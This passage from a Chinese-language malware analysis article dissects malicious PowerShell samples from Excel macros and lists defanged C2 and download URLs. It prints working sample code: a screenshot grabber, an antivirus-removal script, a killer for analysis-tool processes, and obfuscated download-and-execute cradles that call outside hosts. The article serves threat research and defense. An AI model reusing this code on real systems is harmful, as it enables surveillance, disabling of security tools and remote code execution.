&nbsp;&nbsp;&nbsp;&nbsp;Try&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#load&nbsp;required&nbsp;assembly
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Add-Type&nbsp;-Assembly&nbsp;System.Windows.Forms
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Do&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#get&nbsp;the&nbsp;current&nbsp;time&nbsp;and&nbsp;build&nbsp;the&nbsp;filename&nbsp;from&nbsp;it
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Time&nbsp;=&nbsp;(Get-Date)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[String]&nbsp;$FileName&nbsp;=&nbsp;&quot;$($Time.Month)&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&#39;-&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&quot;$($Time.Day)&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&#39;-&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&quot;$($Time.Year)&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&#39;-&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&quot;$($Time.Hour)&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&#39;-&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&quot;$($Time.Minute)&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&#39;-&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&quot;$($Time.Second)&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$FileName&nbsp;+=&nbsp;&#39;.png&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[String]&nbsp;$FilePath&nbsp;=&nbsp;(Join-Path&nbsp;$Path&nbsp;$FileName)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get-Screenshot
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start-Sleep&nbsp;-Seconds&nbsp;$Interval
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;While&nbsp;((Get-Date&nbsp;-Format&nbsp;HH:mm)&nbsp;-lt&nbsp;$EndTime)
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;Catch&nbsp;{Write-Error&nbsp;$Error[0].ToString()&nbsp;+&nbsp;$Error[0].InvocationInfo.PositionMessage}
}
Get-TimedScreenshot&nbsp;-Path&nbsp;&quot;$env:userprofile\Desktop&quot;&nbsp;-Interval&nbsp;2&nbsp;-EndTime&nbsp;24:00</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对于此类攻击，PowerShell代码只是攻击者在行动中使用的整套工具集中的一小部分，攻击者利用PowerShell代码以节省所需功能的研发时间。在这种攻击情况下，Excel宏文档首先会对内嵌的PowerShell进行解码运行并开始抓取屏幕截图，与此同时，宏也解码运行了其他PE文件执行后续攻击动作。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01adc47ca62486ab8b.png" title="t01adc47ca62486ab8b.png" alt="http://p9.qhimg.com/t01adc47ca62486ab8b.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图7. Excel宏对内嵌的PowerShell脚本及PE文件进行解码</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.26 Remove AV（2个样本，占比0.05%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种利用PowerShell强制卸载x86系统和x64系统下的反病毒软件，它遍历注册表中程序卸载键值，查找含有“*AVG*“的条目，在后台静默卸载所找到的每个实例。</span></p><pre class="brush:plain;toolbar:false">$uninstall32s&nbsp;=&nbsp;gci&nbsp;&quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall&quot;&nbsp;|&nbsp;foreach&nbsp;{&nbsp;gp&nbsp;$_.PSPath&nbsp;}&nbsp;|&nbsp;?&nbsp;{&nbsp;$_&nbsp;-like&nbsp;&quot;*AVG*&quot;&nbsp;}&nbsp;|&nbsp;select&nbsp;UninstallString;$uninstall64s&nbsp;=&nbsp;gci&nbsp;&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;&nbsp;|&nbsp;foreach&nbsp;{&nbsp;gp&nbsp;$_.PSPath&nbsp;}&nbsp;|&nbsp;?&nbsp;{&nbsp;$_&nbsp;-like&nbsp;&quot;*AVG*&quot;&nbsp;}&nbsp;|&nbsp;select&nbsp;UninstallString;foreach($uninstall64&nbsp;in&nbsp;$uninstall64s)&nbsp;{$uninstall64&nbsp;=&nbsp;$uninstall64.UninstallString&nbsp;-Replace&nbsp;&quot;MsiExec.exe&quot;,&quot;&quot;&nbsp;-Replace&nbsp;&quot;/I&quot;,&quot;&quot;&nbsp;-Replace&nbsp;&quot;/X&quot;,&quot;&quot;;$uninstall64&nbsp;=&nbsp;$uninstall64.Trim();if($uninstall64&nbsp;-like&nbsp;&quot;*/mode=offline*&quot;){}else{Write-Warning&nbsp;$uninstall64;&nbsp;start-process&nbsp;&quot;msiexec.exe&quot;&nbsp;-args&nbsp;&quot;/x&nbsp;$uninstall64&nbsp;&nbsp;/qn&nbsp;/norestart&quot;&nbsp;-Wait&nbsp;}};foreach($uninstall32&nbsp;in&nbsp;$uninstall32s)&nbsp;{$uninstall32&nbsp;=&nbsp;$uninstall32.UninstallString&nbsp;-Replace&nbsp;&quot;MsiExec.exe&quot;,&quot;&quot;&nbsp;-Replace&nbsp;&quot;/I&quot;,&quot;&quot;&nbsp;-Replace&nbsp;&quot;/X&quot;,&quot;&quot;;$uninstall32&nbsp;=&nbsp;$uninstall32.Trim();if($uninstall32&nbsp;-like&nbsp;&quot;*/mode=offline*&quot;){}else{Write-Warning&nbsp;$uninstall32;&nbsp;start-process&nbsp;&quot;msiexec.exe&quot;&nbsp;-args&nbsp;&quot;/x&nbsp;$uninstall32&nbsp;&nbsp;/qn&nbsp;/norestart&quot;&nbsp;-Wait&nbsp;}};</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">（五）其他小众类别</span></strong><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在对样本进行尽可能细的分类之后，还有大约100个样本无法具体归到某一类中，这些样本通常使用了上文所述技术的定制组合。在此我会对其中值得注意的一些样本做个简单描述。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.27 Hidden Messages</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个样本通过PowerShell将当前时间与内置时间进行比较，如果当前时间早于内置时间，样本则放弃运行。在代码尾部，攻击者留下了一个注释以表明他们所属的黑客组。</span></p><pre class="brush:plain;toolbar:false">if&nbsp;((Get-Date).Ticks&nbsp;-lt&nbsp;(Get-Date&nbsp;-Date&nbsp;&#39;18-jan-2017&nbsp;00:00:00&#39;).Ticks)&nbsp;{(New-Object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://drobbox-api.dynu[.]com/update&#39;,&quot;$env:temp\update&quot;);Start-Process&nbsp;pythonw.exe&nbsp;&quot;$env:temp\update&nbsp;31337&quot;};#NIXU17{pow3r_t0_the_sh3lls}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">另一个样本也留下了一些隐藏信息，如下所示：</span></p><pre class="brush:plain;toolbar:false">while($true){Start-Sleep&nbsp;-s&nbsp;120;&nbsp;$m=New-Object&nbsp;System.Net.WebClient;$pr&nbsp;=&nbsp;[System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;$m.Headers.Add(&#39;user-agent&#39;,&nbsp;&#39;Mozilla/5.0&nbsp;(compatible;&nbsp;MSIE&nbsp;9.0;&nbsp;Windows&nbsp;NT&nbsp;7.1;&nbsp;Trident/5.0)&#39;);&nbsp;iex(($m.downloadstring(&#39;
https://raw.githubusercontent.com/rollzedice/js/master/drupal.js
&nbsp;&nbsp;&#39;)));}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">分析该样本从GitHub上所下载的drupal.js文件，该脚本文件会终止PowerShell进程，并输出“Hello SOC/IR team! :-)“信息。鉴于文件中多处使用了“Test”字符串，我认为它可能是渗透测试或攻防演练中所用的脚本文件。</span><br/></p><p style="text-align:center"><img src="http://p4.qhimg.com/t016c6832f4990122b5.png" title="t016c6832f4990122b5.png" alt="http://p4.qhimg.com/t016c6832f4990122b5.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图8. 结束PowerShell进程的JavaScript文件</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.28 Process Killing</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此样本使用PowerShell完成特定目的，通常用来终止与恶意软件分析相关的多个进程。</span></p><pre class="brush:plain;toolbar:false">kill&nbsp;-processname&nbsp;Taskmgr,&nbsp;ProcessHacker*,&nbsp;Procmon*,&nbsp;Procexp*,&nbsp;Procdump*&nbsp;-force</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.29 Layers of Obfuscation</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这是本文分析的最后一个样本，它似乎与“PowerSploit GTS”变种中的代码有关，两者使用的原始宏基本一致，但此样本没有使用“PowerSploit GTS”的其他代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">该样本使用多层混淆技术以掩盖其攻击行为。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第一层：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">带有宏的Excel文档从单元格中提取base64编码的数据，将数据传递给PowerShell的EncodedCommand参数加以运行。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t015319b5d24f3c5c21.png" title="t015319b5d24f3c5c21.png" alt="http://p3.qhimg.com/t015319b5d24f3c5c21.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二层：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解码后的base64数据是一长串int类型数组，转换为char型字符串后作为另一个PowerShell脚本运行。</span></p><pre class="brush:plain;toolbar:false">-JOIn&nbsp;((&nbsp;32&nbsp;,32&nbsp;,&nbsp;36&nbsp;,86&nbsp;,115&nbsp;,&nbsp;110&nbsp;,&nbsp;50,108&nbsp;,&nbsp;54,&nbsp;32&nbsp;,61&nbsp;,&nbsp;32,32&nbsp;,&nbsp;91,116,121,112,101,&nbsp;93&nbsp;,40&nbsp;,34,123&nbsp;,51&nbsp;,&nbsp;125&nbsp;,&nbsp;123,&nbsp;48&nbsp;,125,&nbsp;123,&nbsp;49,&nbsp;125,&nbsp;,53,&nbsp;45&nbsp;,49,&nbsp;54,55&nbsp;,&nbsp;45,39,&nbsp;44&nbsp;,39&nbsp;,101&nbsp;,&nbsp;46&nbsp;,&nbsp;97,&nbsp;109,&nbsp;97&nbsp;,&nbsp;122&nbsp;,111,110&nbsp;,97,&nbsp;39,&nbsp;44,&nbsp;39&nbsp;,53,39,&nbsp;44,39,&nbsp;119&nbsp;,&nbsp;115,&nbsp;46,&nbsp;99&nbsp;,&nbsp;111&nbsp;,&nbsp;109&nbsp;,58,&nbsp;56&nbsp;,&nbsp;48&nbsp;,&nbsp;39&nbsp;,44&nbsp;,39,45&nbsp;,&nbsp;119,&nbsp;101&nbsp;,115&nbsp;,&nbsp;39,41,&nbsp;41&nbsp;,&nbsp;59)|%{([inT]$_-AS&nbsp;[chAr])&nbsp;}&nbsp;)&nbsp;|&nbsp;iex</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第三层：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解码后的数据使用了多种技术对自身进行混淆处理。第一种技术是在其他字符之间插入反引号字符，该字符将在运行时被忽略。这种技术与命令行中的字符注入技术类似。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二种技术是在其他脚本语言中常见的技术，通过将字符串拆分为随机列表，通过调用特定值完成原始字符串的重建。</span></p><pre class="brush:plain;toolbar:false">$Vsn2l6&nbsp;=&nbsp;&nbsp;[type](&quot;{3}{0}{1}{2}&quot;&nbsp;-F\&#39;UE\&#39;,\&#39;S\&#39;,\&#39;t\&#39;,\&#39;Net.webreq\&#39;)&nbsp;;&nbsp;&nbsp;$h69Q4&nbsp;&nbsp;=[TYPe](&quot;{1}{2}{3}{4}{0}&quot;-F&nbsp;\&#39;he\&#39;,\&#39;nEt.C\&#39;,\&#39;REDeNtialC\&#39;,\&#39;a\&#39;,\&#39;c\&#39;)&nbsp;;&nbsp;&nbsp;${J}=&amp;amp;(&quot;{0}{1}{2}&quot;-f&nbsp;\&#39;new-obj\&#39;,\&#39;ec\&#39;,\&#39;t\&#39;)&nbsp;(&quot;{2}{1}{0}{3}&quot;&nbsp;-f&nbsp;\&#39;eb\&#39;,\&#39;.w\&#39;,\&#39;net\&#39;,\&#39;client\&#39;);${j}.&quot;PRo`XY&quot;=&nbsp;&nbsp;(&nbsp;VaRIablE&nbsp;&nbsp;vsn2L6&nbsp;).VaLuE::(&quot;{0}{3}{2}{4}{1}&quot;-f\&#39;GetS\&#39;,\&#39;Proxy\&#39;,\&#39;em\&#39;,\&#39;yst\&#39;,\&#39;Web\&#39;).Invoke();${j}.&quot;pr`OXY&quot;.&quot;C`RE`De`NTiALs&quot;=&nbsp;(&nbsp;&nbsp;GeT-VariaBle&nbsp;&nbsp;H69Q4).VaLUe::&quot;DE`Faultcred`en`TI`ALS&quot;;.(&quot;{0}{1}&quot;-f&nbsp;\&#39;I\&#39;,\&#39;EX\&#39;)&nbsp;${J}.(&quot;{1}{3}{2}{0}&quot;&nbsp;-f&nbsp;\&#39;string\&#39;,\&#39;do\&#39;,\&#39;load\&#39;,\&#39;wn\&#39;).Invoke((&quot;{3}{1}{9}{11}{8}{13}{0}{4}{15}{5}{10}{2}{12}{14}{7}{6}&quot;&nbsp;-f\&#39;5\&#39;,\&#39;tp://\&#39;,\&#39;mput\&#39;,\&#39;ht\&#39;,\&#39;.us\&#39;,\&#39;t\&#39;,\&#39;0/anSfrf\&#39;,\&#39;8\&#39;,\&#39;185-\&#39;,\&#39;e\&#39;,\&#39;-2.co\&#39;,\&#39;c2-35-167-\&#39;,\&#39;e.amazona\&#39;,\&#39;5\&#39;,\&#39;ws[.]com:80\&#39;,\&#39;-wes\&#39;));</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">以下是对代码进行清理后的版本，可知其功能是远程下载代码并通过Invoke-Expression执行代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$Vsn2l6&nbsp;=&nbsp;[type]Net.webreqUESt;
$h69Q4&nbsp;=&nbsp;[TYPe]nEt.CREDeNtialCache;
&amp;amp;new-object&nbsp;net.webclient;
PRoXY=&nbsp;$Vsn2l6.VaLuE::GetSystemWebProxy.Invoke();
prOXY.CREDeNTiALs&nbsp;=&nbsp;(&nbsp;GeT-VariaBle&nbsp;$h69Q4&nbsp;).VaLUe::DEFaultcredenTIALS;
.IEX&nbsp;downloadstring.Invoke(http://ec2-35-167-185-55.us-west-2.compute.amazonaws[.]com:8080/anSfrf);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">五、结论</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">PowerShell是一个强大的脚本框架，可以提供很多功能，不管是防御方面的功能还是攻击方面的功能。希望本文能够覆盖当前工具和攻击中PowerShell所使用的一些先进技术点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过本文所分析的样本，我们可知大多数攻击活动依然依赖于公共工具的使用，这也在我们的意料之中。随着PowerShell框架不断得到探索和成熟，我认为在将来人们可以看到利用PowerShell开展攻击的更多形态。随着对PowerShell使用方式的逐步创新，攻击者将开始使用PowerShell以利用系统的更多原生功能，而不仅仅是现阶段对PowerShell常见功能的使用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">六、捕获的C2服务器地址或下载链接</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><br/></p><pre class="brush:plain;toolbar:false">6.1&nbsp;Downloader&nbsp;DFSP
675hxxp://94[.]102.53.238/~yahoo/csrsv.exe
244hxxp://89[.]248.170.218/~yahoo/csrsv.exe
132hxxp://94[.]102.58.30/~trevor/winx64.exe
70hxxp://80[.]82.64.45/~yakar/msvmonr.exe
24hxxp://89[.]248.166.140/~zebra/iesecv.exe
18hxxp://cajos[.]in/0x/1.exe
14hxxp://93[.]174.94.137/~karma/scvhost.exe
6hxxp://ddl7[.]data.hu/get/0/9507148/Patload.exe
5hxxp://nikil[.]tk/p1/Pa_001.exe
5hxxp://185[.]45.193.17/update.exe
5hxxp://185[.]141.27.28/update.exe
4hxxps://a[.]pomf.cat/xsakpo.exe
4hxxp://185[.]141.27.35/update.exe
3hxxp://www[.]macwizinfo.com/updates/anna.exe
3hxxp://worldnit[.]com/opera.exe
3hxxp://doc[.]cherrycoffeeequipment.com/nw/logo.png
3hxxp://185[.]141.25.142/update.exe
3hxxp://185[.]117.75.43/update.exe
3hxxp://185[.]106.122.64/update.exe
2hxxp://185[.]141.25.243/file.exe
2hxxp://185[.]141.27.32/update.exe
2hxxp://185[.]141.27.34/update.exe
2hxxp://andersonken4791[.]pserver.ru/doc.exe
2hxxp://boisedelariviere[.]com/backup/css/newconfig.exe
2hxxp://brokelimiteds[.]in/wp-admin/css/upload/Order.exe
2hxxp://ddl7[.]data.hu/get/0/9499830/money.exe
2hxxp://fetzhost[.]net/files/044ae4aa5e0f2e8df02bd41bdc2670b0.exe
2hxxp://hnng[.]moe/f/InX
2hxxp://hnng[.]moe/f/Iot
2hxxp://labid[.]com.my/m/m1.exe
2hxxp://labid[.]com.my/power/powex.exe
2hxxp://labid[.]com.my/spe/spendy.exe
2hxxp://lvrxd[.]3eeweb.com/nano/Calculator.exe
2hxxp://matkalv[.]5gbfree.com/loso/fasoo.exe
2hxxp://net[.]gethost.pw/windro.exe
2hxxp://nikil[.]tk/i1/iz_001.exe
2hxxp://rgho[.]st/68lJcGFLW
2hxxp://rgho[.]st/6hrkjYlX4
2hxxp://toxicsolutions[.]ru/upload/praisefud.exe
2hxxp://worldnit[.]com/KUKU.exe
2hxxp://worldnit[.]com/kundelo.exe
2hxxp://worldnit[.]com/operamini.exe
2hxxp://www[.]wealthandhealthops.com/modules/mod_easyblogquickpost/lawdsijdoef.exe
2hxxps://a[.]pomf.cat/drktzz.exe
2hxxps://a[.]pomf.cat/dwnysn.exe
2hxxps://a[.]pomf.cat/dwnysn.exe
2hxxps://a[.]pomf.cat/hsmqrh.exe
2hxxps://a[.]pomf.cat/mjnspx.exe
2hxxps://a[.]pomf.cat/pabfzv.exe
2hxxps://a[.]pomf.cat/qolcls.exe
2hxxps://a[.]pomf.cat/tpaesb.exe
2hxxps://a[.]pomf.cat/ultxkr.exe
2hxxps://a[.]pomf.cat/vhcwbo.exe
2hxxps://a[.]pomf.cat/vjadwb.exe
2hxxps://a[.]pomf.cat/wopkwj.exe
2hxxps://a[.]pomf.cat/yspcsr.exe
2hxxps://www[.]dropbox.com/s/gx6kxkfi7ky2j6f/Dropbox.exe?dl=1
1hxxp://185[.]106.122.62/file.exe
1hxxp://185[.]45.193.169/update.exe
1hxxp://31[.]184.234.74/crypted/1080qw.exe
1hxxp://aircraftpns[.]com/_layout/images/sysmonitor.exe
1hxxp://allbestunlockerpro[.]com/flash.player.exe
1hxxp://anonfile[.]xyz/f/3d0a4fb54941eb10214f3c1a5fb3ed99.exe
1hxxp://anonfile[.]xyz/f/921e1b3c55168c2632318b6d22a7bfe6.exe
1hxxp://brokelimiteds[.]in/wp-admin/css/upload/ken1.exe
1hxxp://cajos[.]in/0x/1.exe
1hxxp://danhviet[.]com.vn/app/p2.exe
1hxxp://danhviet[.]com.vn/z/v/doc.exe
1hxxp://daratad[.]5gbfree.com/uses/word.exe
1hxxp://ddl2[.]data.hu/get/0/9589621/k000.exe
1hxxp://ddl3[.]data.hu/get/0/9535517/yhaooo.exe
1hxxp://ddl3[.]data.hu/get/0/9551162/ske.exe
1hxxp://ddl7[.]data.hu/get/0/9552103/PFIfdp.exe
1hxxp://getlohnumceders[.]honor.es/kimt.exe
1hxxp://hinrichsen[.]de/assets/win1/win1.exe
1hxxp://icbg-iq[.]com/Scripts/kinetics/categories/3rmax.exe
1hxxp://khoun-legal[.]com/download/ctob.exe
1hxxp://kiana[.]com/flowplayer/aquafresh.exe
1hxxp://labid[.]com.my/power/powex.exe
1hxxp://matkalv[.]5gbfree.com/calab/calafile.exe
1hxxp://matkalv[.]5gbfree.com/noza/odeee.exe
1hxxp://matkalv[.]5gbfree.com/owee/owe.exe
1hxxp://matkalv[.]5gbfree.com/vosa/doc.exe
1hxxp://nikil[.]tk/b1/bo_001.exe
1hxxp://nikil[.]tk/k1/ik_001.exe
1hxxp://sukem[.]zapto.org/word.exe
1hxxp://trolda[.]5gbfree.com/fosee/doc.exe
1hxxp://worldnit[.]com/aba.exe
1hxxp://worldnit[.]com/aba.exe
1hxxp://worldnit[.]com/abacoss.exe
1hxxp://worldnit[.]com/abuchi.exe
1hxxp://worldnit[.]com/com.exe
1hxxp://worldnit[.]com/com.exe
1hxxp://worldnit[.]com/compu.exe
1hxxp://worldnit[.]com/comu.exe
1hxxp://worldnit[.]com/firefox32.exe
1hxxp://worldnit[.]com/igbo.exe
1hxxp://worldnit[.]com/immo.exe
1hxxp://worldnit[.]com/kele.exe
1hxxp://worldnit[.]com/kelle.exe
1hxxp://worldnit[.]com/kells.exe
1hxxp://worldnit[.]com/kuku.exe
1hxxp://worldnit[.]com/nigga.exe
1hxxp://worldnit[.]com/nigga.exe
1hxxp://worldnit[.]com/office.exe
1hxxp://worldnit[.]com/pony.exe
1hxxp://worldnit[.]com/seccrypt.exe
1hxxp://worldnit[.]com/sect.exe
1hxxp://www[.]athensheartcenter.com/crm/cgi-bin/lnm.exe
1hxxp://www[.]bryonz.com/emotions/files/lnwe.exe
1hxxp://www[.]fluidsystems.ml/P1/Pa_001.exe
1hxxp://www[.]macwizinfo.com/updates/eter.exe
1hxxp://www[.]matrimonioadvisor.it/pariglia.exe
1hxxp://www[.]pelicanlinetravels.com/images/xvcbkty.exe
1hxxp://www[.]telemedia.co.za/wp-content/ozone/slim.exe
1hxxp://www[.]wealthandhealthops.com/modules/mod_easybloglist/kntgszu.exe
1hxxp://www[.]wvhmedicine.ru/1/P2.exe
1hxxps://1fichier[.]com/?hfshjhm0yf
1hxxps://1fichier[.]com/?v8w3g736hj
1hxxps://a[.]pomf.cat/jfyywz.exe
1hxxps://a[.]pomf.cat/klckcp.exe
1hxxps://a[.]pomf.cat/wopkwj.exe
1hxxps://a[.]pomf.cat/yhggkj.exe
1hxxps://dryversdocumentgritsettings[.]com/javaupdat3s2016.exe
1hxxps://megadl[.]fr/?b5r5bstqd1
1hxxps://srv-file1[.]gofile.io/download/SJLKaG/84.200.65.20/wscript.exe
6.2&nbsp;PowerShell&nbsp;Empire
39hxxp://198[.]18.133.111:8081/index.asp
8hxxp://95[.]211.139.88:80/index.asp
5hxxps://46[.]101.90.248:443/index.asp
5hxxp://microsoft-update7[.]myvnc.com:443/index.asp
5hxxp://145[.]131.7.190:8080/index.asp
3hxxps://52[.]39.227.108:443/index.asp
3hxxp://vanesa[.]ddns.net:443/index.asp
3hxxp://polygon[.]1dn0.xyz/index.asp
3hxxp://159[.]203.18.172:8080/index.asp
2hxxps://dsecti0n[.]gotdns.ch:8080/index.asp
2hxxps://69[.]20.66.229:9443/index.asp
2hxxps://50[.]3.74.72:8080/index.asp
2hxxps://205[.]232.71.92:443/index.asp
2hxxp://hop[.]wellsfargolegal.com/index.asp
2hxxp://ciagov[.]gotdns.ch:8080/index.asp
2hxxp://chgvaswks045[.]efgz.efg.corp:888/index.asp
2hxxp://ads[.]mygoogle-analytics.com:80/index.asp
2hxxp://84[.]200.84.185:443/index.asp
2hxxp://84[.]14.146.74:443/index.asp
2hxxp://66[.]11.115.25:8080/index.asp
2hxxp://64[.]137.176.174:12345/index.asp
2hxxp://52[.]28.242.165:8080/index.asp
2hxxp://52[.]19.131.17:80/index.asp
2hxxp://23[.]239.12.15:8080/index.asp
2hxxp://212[.]99.114.202:443/count.php?user=
2hxxp://188[.]68.59.11:8081/index.asp
2hxxp://185[.]117.72.45:8080/index.asp
2hxxp://163[.]172.175.132:8089/index.asp
2hxxp://159[.]203.89.248:80/index.asp
2hxxp://14[.]144.144.66:8081/index.asp
2hxxp://103[.]238.227.201:7788/index.asp
1hxxps://www[.]enterprizehost.com:9443/index.asp
1hxxps://sixeight[.]av-update.com:443/index.asp
1hxxps://remote-01[.]web-access.us/index.asp
1hxxps://msauth[.]net/index.asp
1hxxps://metrowifi[.]no-ip.org:8443/index.asp
1hxxps://megalon[.]trustwave.com:443/index.asp
1hxxps://mail[.]microsoft-invites.com/index.asp
1hxxps://logexpert[.]eu/index.asp
1hxxps://host-101[.]ipsec.io/index.asp
1hxxps://93[.]176.84.45:443/index.asp
1hxxps://93[.]176.84.34:443/index.asp
1hxxps://66[.]60.224.82:443/index.asp
1hxxps://66[.]192.70.39:443/index.asp
1hxxps://66[.]192.70.38:80/index.asp
1hxxps://52[.]86.125.177:443/index.asp
1hxxps://50[.]251.57.67:8080/index.asp
1hxxps://46[.]101.203.156:443/index.asp
1hxxps://46[.]101.185.146:8080/index.asp
